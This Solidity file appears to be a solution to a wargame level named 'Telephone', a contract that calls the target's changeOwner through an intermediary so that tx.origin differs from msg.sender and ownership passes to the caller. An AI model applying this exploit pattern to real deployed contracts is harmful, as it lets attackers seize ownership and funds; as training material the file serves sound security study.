pragma solidity ^0.6.0;
import "./4-Telephone.sol";

contract TelephoneAttack {
    Telephone telephoneContract;

    constructor(address telephoneContractAddress) public {
        telephoneContract = Telephone(telephoneContractAddress);
    }

    function changeOwner() public {
        telephoneContract.changeOwner(tx.origin);
    }
}
